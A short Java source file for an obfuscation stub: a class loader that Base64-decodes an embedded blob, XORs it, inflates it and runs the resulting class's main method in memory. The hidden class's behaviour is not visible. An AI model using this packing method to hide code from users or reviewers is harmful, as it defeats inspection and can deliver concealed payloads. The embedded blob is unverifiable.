import java.io.ByteArrayOutputStream;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.zip.DataFormatException;
import java.util.zip.Inflater;

/**
 * Created by azarn on 5/18/16.
 */
public class JavaObfuscateStub extends ClassLoader {
    private static byte XOR_CONSTANT = -61;
    private static String OBFUSCATED_DATA = "uxm2kRitEIPT/ihbO5Hk6o1QsYoCrnr77a5jN8ZCU4livoqY48JqIWIZ52gLBnJgG4IpHDMF8MvRSok+w/3J8iiHl4NTJl5ecPCkNQ8NTFwcDMKvogiH3dbA5VXPHwOOzk3K1tbeCBFtC6YWB+4fFbMEZ3N4sbK2l/a7z6nhIUcCbVwzzH/VM3OYqOfA/C/9pQv9MoD8ugmTsTz+bX1mJ15r4NvJtvzXxACdiM9Zf9bTYbfgRU9YBTd73PFXHrRw+rFOR3QcLDA99xavhwCCmC85EQr0KrX4wkwgzlqvIvEJ1clbFHOlIt0V2tU8pb71N0BN21NlPpCkwfqRZyAETUbOF+8fBMDOWNXdAaXzvRRTN3VG0QmXOiMzOzpIHi70NiUyNSj+RTpI+URu0BKNPUPZZLLhuWf62RGCquEWTKnsar+BVNN/5NgJOL7StdsVpPZ3PdzmV2vkEsehm7NocB1p+2DhQBVUndOh2rGPw7nZGv0ZpivkekfXqiTSbVP2fvJbdDXOCST3uUIVv9loEt8q8yugcYAQf4S3BQvtvoIlzykS21QvL8tZNNbJWtI30k/I6fDuoWJB39LuIQlXJdZSiFmWLJ8+SyHaD+DscPoFH8sV5NdnrCTlbeeQkfFYUYOZcbHpS6VGLbZW09aJuk0rbWZSFLzCZBNkmQ==";

    public Class findClass(String name) {
        byte[] data = Base64.getDecoder().decode(OBFUSCATED_DATA);
        for (int i = 0; i < data.length; ++i) {
            data[i] ^= XOR_CONSTANT;
        }

        Inflater inflater = new Inflater();
        inflater.setInput(data);

        ByteArrayOutputStream res = new ByteArrayOutputStream();
        try {
            byte[] buf = new byte[1024];
            while (!inflater.finished()) {
                int count = inflater.inflate(buf);
                res.write(buf, 0, count);
            }
        } catch (DataFormatException e) {
            return null;
        }

        inflater.end();
        data = res.toByteArray();
        return defineClass(name, data, 0, data.length);
    }

    public static void main(String args[]) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        new JavaObfuscateStub().findClass(null).getMethod("main", String[].class).invoke(null, (Object)args);
    }
}
